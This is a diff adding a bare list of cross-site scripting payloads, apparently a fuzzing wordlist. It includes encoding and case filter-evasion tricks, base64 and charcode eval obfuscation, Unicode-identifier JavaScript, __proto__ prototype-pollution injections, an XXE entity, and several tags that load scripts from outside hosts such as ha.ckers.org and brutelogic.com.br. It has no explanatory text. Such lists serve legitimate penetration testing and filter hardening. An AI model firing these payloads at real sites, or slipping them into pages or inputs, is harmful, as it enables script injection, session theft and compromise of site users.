@@ -1,0 +1,582 @@
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14; javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://google.com"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://google.com"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<iframe src=http://google.com <
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="livescript:[code]">
+<BODY ONLOAD=alert('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+";a=prompt,a()//
+"><iframe%20src="http://google.com"%%203E
+"><img src=1 onerror=alert(1)>.gif
+"><img src=x onerror=prompt(1);>
+"><img src=x onerror=window.open('https://www.google.com/');>
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><script src=//brutelogic.com.br&sol;1.js&num; 
+"><script src=data:&comma;alert(1)//
+"><svg onload=alert(1)//
+%22%3C!--%3E%3CSvG%20OnLoad=确认?.(/steven11/)%3C!--%22%29%22%3C%21--%3E%3CSvG+OnLoad%3D确认%3f%2e%28%2fsteven11%2f%29%3C%21--
+%22%3C!--%3E%3CSvG%20OnLoad=確認?.(/steven12/)%3C!--%22%29%22%3C%21--%3E%3CSvG+OnLoad%3D確認%3f%2e%28%2fsteven12%2f%29%3C%21--
+%22%3Csvg%20onload=%22确认?.(/steven13/)%22%3E%3C/svg%3E
+%22%3Csvg%20onload=%22確認?.(/steven14/)%22%3E%3C/svg%3E
+%22%3Ciframe%20src=%22javascript:确认?.(/steven15/)%22%3E%3C/iframe%3E
+%22%3Ciframe%20src=%22javascript:確認?.(/steven16/)%22%3E%3C/iframe%3E
+%22%3Cinput%20type=%22text%22%20value=%22%22%20onfocus=%22确认?.(/steven17/)%22%3E
+%22%3Cinput%20type=%22text%22%20value=%22%22%20onfocus=%22確認?.(/steven18/)%22%3E
+%22%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=javascript:确认?.(/steven19/)%22%3E
+%22%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=javascript:確認?.(/steven20/)%22%3E
+%22%3Ca%20href=%22data:text/html,%3Cscript%3Edocument.write('confirm(/steven21/)')%3C/script%3E%22%3EClick%20Me%3C/a%3E
+%22%3Ciframe%20srcdoc=%22%3Cscript%3Econfirm(/steven22/)%3C/script%3E%22%3E%3C/iframe%3E
+%22%3Ctemplate%20id=%22tmpl%22%3E%3Cscript%3Econfirm(/steven23/)%3C/script%3E%3C/template%3E%3Cdiv%3E%3Cscript%3Edocument.body.appendChild(document.getElementById('tmpl').content)%3C/script%3E%3C/div%3E
+%22%3Csvg%20width=%220%22%20height=%220%22%3E%3Canimate%20attributeName=%22href%22%20to=%22javascript:confirm(/steven24/)%22%20/%3E%3C/svg%3E
+%22%3Cbutton%20id=%22btn%22%3EClick%20Me%3C/button%3E%3Cscript%3Evar%20event%20=%20new%20CustomEvent('custom',%20{detail:%20confirm(/steven25/)});document.getElementById('btn').dispatchEvent(event);%3C/script%3E
+%22%3Cscript%3Eclass%20stevenComponent%20extends%20HTMLElement%20{connectedCallback()%20{confirm(/steven26/);}}customElements.define('steven-comp',%20stevenComponent);document.body.appendChild(new%20stevenComponent());%3C/script%3E
+%22%3Cdiv%20id=%22target%22%3E%3C/div%3E%3Cscript%3Evar%20observer%20=%20new%20IntersectionObserver(function()%20{confirm(/steven27/);});observer.observe(document.getElementById('target'));%3C/script%3E
+%22%3Cdiv%20id=%22target%22%3E%3C/div%3E%3Cscript%3Evar%20observer%20=%20new%20MutationObserver(function()%20{confirm(/steven28/);});observer.observe(document.getElementById('target'),%20{childList:%20true});document.getElementById('target').innerHTML%20=%20%27%3Cscript%3E%27;%3C/script%3E
+%22%3Cscript%20nonce=%22random%22%3Econfirm(/steven29/)%3C/script%3E%3Cscript%3Edocument.querySelector('script[nonce=random]').nonce=%27%27;%3C/script%3E
+%22%3Cscript%3ElocalStorage.setItem('steven','%3Cimg%20src=%22x%22%20onerror=%22confirm(/steven30/)%22%3E');document.write(localStorage.getItem('steven'));%3C/script%3E
+%22%3Cstyle%3Ebody{background:url('javascript:confirm(/steven1/)');}%3C/style%3E
+%22%3Cform%20action=%22javascript:confirm(/steven2/)%22%3E%3Cinput%20type=%22submit%22%20value=%22Click%20Me%22%3E%3C/form%3E
+%22%3Ciframe%20src=%22javascript:confirm(/steven3/)%22%3E%3C/iframe%3E
+%22%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%3E%3Ccircle%20cx=%2250%25%22%20cy=%2250%25%22%20r=%2250%25%22%20fill=%22none%22%20onmouseenter=%22confirm(/steven4/)%22/%3E%3C/svg%3E
+%22%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=javascript:confirm(/steven5/)%22%3E
+%22%3Cinput%20type=%22text%22%20value=%22%22%20onfocus=%22confirm(/steven6/)%22%3E
+%22%3Cmarquee%20onstart=%22confirm(/steven7/)%22%3E%3C/marquee%3E
+%22%3Ca%20href=%22data:text/html;base64,PHNjcmlwdD5jb25maXJtKC94c3M4Lyk8L3NjcmlwdD4=%22%3EClick%20Me%3C/a%3E
+%22%3Cbase%20href=%22javascript:confirm(/steven9/)%22%3E
+%22%3Cscript%3EsetTimeout(%22confirm(/steven10/)%22,0)%3C/script%3E
+%22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/d3rk%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2fd3rk%F0%9F%98%88%2f%29%3C%21--
+%22-[9].every(alert)-%22//
+%22%3C!--%3E%3CSvG%20OnLoad=confirm?.(/x5r4k%F0%9F%98%88/)%3C!--2%22%29%22%3C%21--%3E%3CSvG+OnLoad%3Dconfirm%3f%2e%28%2fx5r4k%F0%9F%98%88%2f%29%3C%21--
+%22%3C!--%3E%3CsvG%20OnLoad=confirm?.(/y2p9m%F0%9F%98%88/)%3C!--3%22%29%22%3C%21--%3E%3CsvG+OnLoad%3Dconfirm%3f%2e%28%2fy2p9m%F0%9F%98%88%2f%29%3C%21--
+%22%3C!--%3E%3CsvG%20OnLoad=%22javascript:confirm?.(/a7z1v%F0%9F%98%88/)%22%3C!--4%22%29%22%3C%21--%3E%3CsvG+OnLoad%3D%22javascript%3Aconfirm%3f%2e%28%2fa7z1v%F0%9F%98%88%2f%29%22%3C%21--
+%22%3C!--%3E%3CsvG%20OnLoad=%60confirm?.(/p8d5q%F0%9F%98%88/)%60%3C!--5%22%29%22%3C%21--%3E%3CsvG+OnLoad%3D%60confirm%3f%2e%28%2fp8d5q%F0%9F%98%88%2f%29%60%3C%21--
+%22%3C!--%3E%3CsvG%20OnMouseOver=confirm?.(/k9t6f%F0%9F%98%88/)%3C!--6%22%29%22%3C%21--%3E%3CsvG+OnMouseOver%3Dconfirm%3f%2e%28%2fk9t6f%F0%9F%98%88%2f%29%3C%21--
+%22%3C!--%3E%3CSVG%20OnLoad=%26%23x63%3B%26%23x6F%3B%26%23x6E%3B%26%23x66%3B%26%23x69%3B%26%23x72%3B%26%23x6D%3B?.(/z7q2n%F0%9F%98%88/)%3C!--7%22%29%22%3C%21--%3E
+%22%3C!--%3E%3CSvG%20OnLoad=confirm?.(/u4j3n%F0%9F%98%88/)%3C!--8%22%29%22%3C%21--%3E%3CSvG+OnLoad%3Dconfirm%3f%2e%28%2fu4j3n%F0%9F%98%88%2f%29%3C%21--
+%22%3C!--%3E%3CsvG%20OnFocus=confirm?.(/v3l5t%F0%9F%98%88/)%3C!--9%22%29%22%3C%21--%3E%3CsvG+OnFocus%3Dconfirm%3f%2e%28%2fv3l5t%F0%9F%98%88%2f%29%3C%21--
+%22%3C!--%3E%3CsvG%20OnLoad=%27confirm?.(/s6b8w%F0%9F%98%88/)%27%3C!--10%22%29%22%3C%21--%3E%3CsvG+OnLoad%3D%27confirm%3f%2e%28%2fs6b8w%F0%9F%98%88%2f%29%27%3C%21--
+%22%3C!--%3E%3CsvG%20OnLoad=window.confirm?.(/e9h7q%F0%9F%98%88/)%3C!--11%22%29%22%3C%21--%3E%3CsvG+OnLoad%3Dwindow.confirm%3f%2e%28%2fe9h7q%F0%9F%98%88%2f%29%3C%21--
+%22%3C!--%3E%3CsvG%20OnLoad=%60window.confirm?.(/g4k6m%F0%9F%98%88/)%60%3C!--12%22%29%22%3C%21--%3E%3CsvG+OnLoad%3D%60window.confirm%3f%2e%28%2fg4k6m%F0%9F%98%88%2f%29%60%3C%21--
+%22%3C!--%3E%3CSvG%20OnLoad=%22&#99;&#111;&#110;&#102;&#105;&#114;&#109;.(/h2r8t%F0%9F%98%88/)%22%3C!--13%22%29%22%3C%21--%3E%3CSvG+OnLoad=%22&#99;&#111;&#110;&#102;&#105;&#114;&#109;.(/h2r8t%F0%9F%98%88/)%22%3C%21--
+<img src="invalid-image.jpg" onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">
+<body onload="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">
+<button onclick="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">Click me</button>
+<a href="javascript:𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">Click here</a>
+<svg onload="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></svg>
+<iframe src="javascript:𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></iframe>
+<form onfocus="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></form>
+<video onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></video>
+<audio onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></audio>
+<input onfocus="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">
+&__proto__[backLink]=<a href="javascript:𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">Click here</a>
+&__proto__[name]=<button onclick="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">Click me</button>
+&__proto__[teste]=<body onload="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">
+&__proto__[pass]=<img src="invalid-image.jpg" onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">
+&__proto__[username]=<svg onload="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></svg>
+&__proto__[email]=<iframe src="javascript:𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></iframe>
+&__proto__[s]=<form onfocus="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></form>
+&__proto__[search]=<video onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></video>
+&__proto__[query]=<audio onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')"></audio>
+&__proto__[backLink]=<input onfocus="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')">
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x56;&#x75;&#x6c;&#x6e;&#x65;&#x72;&#x61;&#x62;&#x69;&#x6c;&#x69;&#x64;&#x61;&#x64;&#x65;&#x20;&#x64;&#x65;&#x74;&#x65;&#x63;&#x74;&#x61;&#x64;&#x61;&#x27;&#x29;"></svg>
+<svg onload="eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))"></svg>
+<svg onload="eval('win'+'dow.'+'alert'+'(\'ticofook\')')"></svg>
+<div id="detailsToggle" style="display: inline-block; cursor: pointer; padding: 5px; border: 1px solid black;">Hover over me</div><script>document.getElementById('detailsToggle').addEventListener('mouseover', function() {var x='alert';var y='domain';window[x](document[y]);});</script>
+<details id="&quot;" open ontoggle="var x='alert';var y='domain';window[x](document[y])">
+<span id="detailsToggle" onclick="var x='alert';var y='domain';window[x](document[y])" style="display: block; cursor: pointer;">Click me</span>
+<svg onload="this['a'+'lert']('ticofook')"></svg>
+<button id="detailsToggle" onclick="var x='alert';var y='domain';window[x](document[y])">Click me</button>
+<details id="&quot;" open ontoggle="document.getElementById('codVerify').value=location.hostname"><input type="text" id="codVerify" readonly></details>
+<svg onload="(()=>{alert('ticofook')})()"></svg>
+<div id="detailsToggle" onclick="var x='alert';var y='domain';window[x](document[y])" style="display: inline-block; cursor: pointer; padding: 5px; border: 1px solid black;">Click me</div>
+<details id="&quot;" open ontoggle="document.getElementById('siteName').value=window.location.hostname"><input type="text" id="siteName" readonly></details>
+<svg>  <desc><![CDATA[<script>window.alert('ticofook')</script>]]></desc></svg>
+<div id="detailsToggle" onmouseover="var x='alert';var y='domain';window[x](document[y])" style="display: inline-block; cursor: pointer; padding: 5px; border: 1px solid black;">Hover over me</div>
+<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+<div id="detailsToggle" data-onmouseover="var x='alert';var y='domain';window[x](document[y])" onmouseover="eval(this.getAttribute('data-onmouseover'))" style="display: inline-block; cursor: pointer; padding: 5px; border: 1px solid black;">Hover over me</div>
+&__proto__[backLink]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+&__proto__[name]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+&__proto__[teste]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+&__proto__[pass]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+&__proto__[username]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+&__proto__[email]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+&__proto__[s]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+&__proto__[search]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+&__proto__[query]=<svg onload="(()=>{eval(atob('d2luZG93LmFsZXJ0KCdWdWxuZXJhYmlsaWRhZGUgZGV0ZWN0YWRhIScp'))})()"></svg>
+<svg onload="/*--*/window/*--*/./*--*/alert/*--*/(/*--*/'ticofook'/*--*/)"></svg>
+<svg onload="setTimeout(function(){alert('ticofook')}, 1000)"></svg>
+<svg onload="(function(a,b,c,d,e,f){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){f[c.toString(a)]=d[c]||c.toString(a)}d=[function(e){return f[e]}];e=function(){return'\\w+'};c=1};while(c--){if(d[c]){b=b.replace(new RegExp('\\b'+e(c)+'\\b','g'),d[c])}}return b}(22,'8 4, 3=\'\\2\\6\\5\\7\\b\\9\\c\\a\\1\'.\\d()'.split(','),0,{}))"></svg>
+<form action="https://targetsite.com/search" method="GET"><input type="hidden" name="__proto__[backLink]" value="<svg onload=window.alert('ticofook')>" /><input type="submit" /></form>
+<a href="javascript:alert(&#39;ticofook&#39;)">Clique aqui</a>
+<IMG SRC="JaVaScRiPt:alert('ticofook')">
+<input type="text" onfocus="alert('ticofook')" onmouseover="alert('ticofook')">
+<script>document.write('<img src="x" onerror="alert(\'ticofook\')">');</script>
+<div style="background-image: url('javascript:alert(\'ticofook\')')"></di</div>
+<script>var jsonString = '{"name":"<img src=x onerror=alert(\'ticofook\')>"}';var obj = JSON.parse(jsonString);document.write(obj.name);</script>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "javascript:alert('ticofook')" >]><foo>&xxe;</foo>
+<div style="width: expression(alert('ticofook'));"></div>
+<div style="background-image: url('data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+')"></div>
+document.write('<img src=\u00b3xon=\'alert(\'ticofook\')\'>');
+<svg onload="eval(atob('ZG9jdW1lbnQud3JpdGUoJzxpbWcgc3JjPVx1MDBiM3hvbj0nYWxlcnQoJ1Z1bG5lcmFiaWxpZGFkZSBkZXRlY3RhZGEnKSc+Jyk7'))"></svg>
+<svg onload="eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,34,86,117,108,110,101,114,97,98,105,108,105,100,97,100,101,32,100,101,116,101,99,116,97,100,97,33,34,41,39,41))"></svg>
+<svg>  <desc><![CDATA[<script>window.alert('ticofook')</script>]]></desc></svg>
+<svg onmouseover="this.setAttribute('onload','window.alert(1)')" onload="this.onmouseover()"></svg>
+<svg onmouseover="this.setAttribute('onload','alert(1)')" onload="this.onmouseover()"></svg>
+<svg onload="this.innerHTML=unescape('%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28%27ticofook%20detectada%27%29%22%3E')"></svg>
+<input type="text" value="<img src=x onerror=window.alert('ticofook')>" onfocus="this.setAttribute('onmouseover', 'eval(String.fromCharCode(97,108,101,114,116,40,39,86,117,108,110,101,114,97,98,105,108,105,100,97,100,101,32,100,101,116,101,99,116,97,100,97,33,39,41))')" onmouseover="this.onfocus()">
+<input type="text" value="<img src=x onerror=alert('ticofook')>" onfocus="this.setAttribute('onmouseover', 'eval(String.fromCharCode(97,108,101,114,116,40,39,86,117,108,110,101,114,97,98,105,108,105,100,97,100,101,32,100,101,116,101,99,116,97,100,97,33,39,41))')" onmouseover="this.onfocus()">
+<svg onload="setTimeout(function(){alert('ticofook')}, 1000)"></svg>
+<svg onload="setTimeout(function(){window.alert('ticofook')}, 1000)"></svg>
